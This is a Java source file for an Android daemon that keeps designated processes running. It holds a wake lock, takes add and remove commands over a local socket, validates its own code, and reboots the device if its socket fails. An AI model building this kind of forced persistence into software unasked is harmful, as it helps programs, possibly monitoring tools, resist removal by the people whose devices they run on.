package com.fx.pmond;

import java.util.HashMap;

import android.content.Context;
import android.os.Looper;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;

import com.fx.daemon.DaemonHelper;
import com.fx.daemon.util.CrashReporter;
import com.fx.daemon.util.ProcessMonitoring;
import com.fx.daemon.util.WatchingProcess;
import com.fx.pmond.ref.Customization;
import com.fx.pmond.ref.MonitorDaemonResource;
import com.fx.pmond.ref.command.RemoteAddProcess;
import com.fx.pmond.ref.command.RemoteRemoveProcess;
import com.fx.pmond.security.FxConfigReader;
import com.fx.socket.RemoteCheckAlive;
import com.fx.socket.RemoteCheckSync;
import com.fx.socket.RemoteSetSync;
import com.fx.socket.RemoteSetSync.SyncData;
import com.fx.socket.SocketCmd;
import com.fx.socket.SocketCmdServer;
import com.vvt.logger.FxLog;
import com.vvt.shell.ShellUtil;
import com.vvt.timer.TimerBase;

public class MonitorDaemonMain {
	
	private static final String TAG = "MonitorDaemonMain";
	private static boolean LOGV = Customization.VERBOSE;
	private static boolean LOGD = Customization.DEBUG;
	private static boolean LOGE = Customization.ERROR;
	
	private static Context sContext;
	private static HashMap<String, SyncData> sSyncMap;
	private static ProcessMonitoring sProcessMonitoring;
	private static SocketCmdServer sSocketCmdServer;
	private static WakeLock sWakeLock;
	
	public static void main(String[] args) {
		Thread.setDefaultUncaughtExceptionHandler(new CrashReporter(TAG));
		
		DaemonHelper.initLog(
				MonitorDaemonResource.LOG_FOLDER, 
				MonitorDaemonResource.LOG_FILENAME);
		
		if (LOGD) FxLog.d(TAG, "main # ENTER ...");
		
		String processName = MonitorDaemonResource.PROCESS_NAME;
		
		if (ShellUtil.isProcessRunning(processName)) {
			if (LOGE) FxLog.e(TAG, "main # Daemon is already running!!");
			ShellUtil.killSelf();
			return;
		}
		
		DaemonHelper.setProcessName(processName);
		
		if (LOGD) FxLog.d(TAG, "main # Waiting until the system is ready ...");
		DaemonHelper.waitSystemReady();
		
		if (LOGD) FxLog.d(TAG, "main # Looper.prepare() ...");
		Looper.prepare();
		
		if (LOGD) FxLog.d(TAG, "main # Create system context ...");
		sContext = DaemonHelper.getSystemContext();
		if (sContext == null) {
			if (LOGE) FxLog.e(TAG, "main # Create SystemContext FAILED!!");
			ShellUtil.killSelf();
			return;
		}
		
		if (LOGD) FxLog.d(TAG, "main # Validate dex zip file ...");
		boolean isDexFileValid = FxConfigReader.isPmondValid(
				String.format("%s/%s", 
						MonitorDaemonResource.EXTRACTING_PATH, 
						MonitorDaemonResource.DEX_ZIP_FILENAME), 
				String.format("%s/%s", 
						MonitorDaemonResource.EXTRACTING_PATH, 
						MonitorDaemonResource.SECURITY_CONFIG_FILE));
		if (! isDexFileValid) {
			if (LOGE) FxLog.e(TAG, "main # Validation FAILED!!");
			ShellUtil.killSelf();
			return;
		}
		
		if (acquireWakeLock(sContext)) {
			if (LOGD) FxLog.d(TAG, "main # PARTIAL_WAKE_LOCK acquired!");
		}
		else {
			if (LOGE) FxLog.e(TAG, "main # Acquire WakeLock FAILED!!");
			ShellUtil.killSelf();
			return;
		}
		
		if (LOGD) FxLog.d(TAG, "main # Prepare server socket ...");
    	boolean isServerSocketCreated = prepareServerSocket();
    	if (! isServerSocketCreated) {
    		if (LOGE) FxLog.e(TAG, "main # Create server socket FAILED!!");
			ShellUtil.killSelf();
			return;
    	}
		
		if (LOGV) FxLog.v(TAG, "main # Start process monitoring");
		WatchingProcess pmond = new WatchingProcess();
		pmond.setProcessName(MonitorDaemonResource.PROCESS_NAME);
		pmond.setServerName(MonitorDaemonResource.SOCKET_NAME);
		pmond.setStartupScriptPath(MonitorDaemonResource.STARTUP_SCRIPT_PATH);
		
		sProcessMonitoring = new ProcessMonitoring(TAG, MonitorDaemonResource.MONITOR_INTERVAL);
		sProcessMonitoring.addMonitoringProcess(pmond);
		sProcessMonitoring.start();
		
		FxLog.d(TAG, "main # Start watching log file size");
    	startWatchLogFileSize();
		
		if (LOGD) FxLog.d(TAG, "main # Notify startup success");
		notifyStartupSuccess();
		
		if (LOGD) FxLog.d(TAG, "main # Looper.loop() ...");
		Looper.loop();
		
		if (LOGV) FxLog.v(TAG, "main # EXIT ...");
	}

	private static void startWatchLogFileSize() {
		final String logPath = String.format("%s/%s", 
				MonitorDaemonResource.LOG_FOLDER, MonitorDaemonResource.LOG_FILENAME);
		final String logBakPath = String.format("%s.bak", logPath);
		
		TimerBase timer = new TimerBase() {
			@Override
			public void onTimer() {
				DaemonHelper.handleLogFileSize(
						DaemonHelper.DEFAULT_LOG_SIZE, logPath, logBakPath); 			
			}
		};
		timer.setTimerDurationMs(MonitorDaemonResource.MONITOR_INTERVAL);
		timer.start();
	}

	private static boolean acquireWakeLock(Context context) {
		PowerManager powerManager = 
				(PowerManager) context.getSystemService(Context.POWER_SERVICE);
		
		if (sWakeLock == null || !sWakeLock.isHeld()) {
			sWakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);
			sWakeLock.acquire();
		}
		
		return sWakeLock != null && sWakeLock.isHeld();
	}
	
	private static void notifyStartupSuccess() {
		sContext.getContentResolver().notifyChange(
				MonitorDaemonResource.URI_STARTUP_SUCCESS, null);
	}

	private static boolean prepareServerSocket() {
		if (LOGV) FxLog.v(TAG, "prepareServerSocket # ENTER ...");
		
		boolean isSuccess = false;
		
		try {
			sSocketCmdServer = new SocketCmdServer(TAG, MonitorDaemonResource.SOCKET_NAME) {
				@Override
				public Object process(SocketCmd<?, ?> command) {
					return processCommand(command);
				}
			};
			sSocketCmdServer.start();
			isSuccess = true;
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(TAG, String.format("prepareServerSocket # Error: %s", e));
			if (LOGE) FxLog.e(TAG, "prepareServerSocket # Reboot system ...");
			DaemonHelper.rebootDevice(sContext);
		}
		
		if (LOGV) FxLog.v(TAG, "prepareServerSocket # EXIT ...");
		return isSuccess;
	}

	private static Object processCommand(SocketCmd<?, ?> command) {
		if (LOGV) FxLog.v(TAG, "processCommand # ENTER ...");
		
		Object response = null;
		
		if (command instanceof RemoteCheckAlive) {
			if (LOGV) FxLog.v(TAG, "processCommand # Check alive");
			response = true;
		}
		else if (command instanceof RemoteCheckSync) {
			if (LOGV) FxLog.v(TAG, "processCommand # Check sync");
			String clientPkg = ((RemoteCheckSync) command).getData();
			response = (boolean) (sSyncMap != null && sSyncMap.keySet().contains(clientPkg));
		}
		else if (command instanceof RemoteSetSync) {
			if (LOGV) FxLog.v(TAG, "processCommand # Set sync");
			SyncData syncData = ((RemoteSetSync) command).getData();
			response = addSyncPackage(syncData.getClientPackage(), syncData);
		}
		else if (command instanceof RemoteAddProcess) {
			if (LOGD) FxLog.d(TAG, "processCommand # Add watching process");
			WatchingProcess process = ((RemoteAddProcess) command).getData();
			sProcessMonitoring.addMonitoringProcess(process);
			response = true;
		}
		else if (command instanceof RemoteRemoveProcess) {
			if (LOGD) FxLog.d(TAG, "processCommand # Remove watching process");
			String processName = ((RemoteRemoveProcess) command).getData();
			response = sProcessMonitoring.removeMonitoringProcess(processName);
		}
		
		if (LOGV) FxLog.v(TAG, "processCommand # EXIT ...");
		return response;
	}
	
	private static boolean addSyncPackage(String clientPkg, SyncData syncData) {
		if (sSyncMap == null) {
			sSyncMap = new HashMap<String, SyncData>();
		}
		return sSyncMap.put(clientPkg, syncData) == null;
	}
	
}
